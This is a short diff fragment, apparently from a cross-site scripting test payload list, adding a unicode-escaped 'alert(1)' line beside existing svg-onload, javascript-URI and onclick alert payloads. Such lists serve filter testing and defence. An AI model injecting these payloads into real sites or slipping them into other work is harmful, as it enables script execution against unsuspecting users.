@@ -9,3 +9,4 @@
 '><svg/onload=alert(5)>
 javascript://alert`2`
 <div onclick="javascript:alert`2`" > Click me! </div>
+\u0061lert(1)
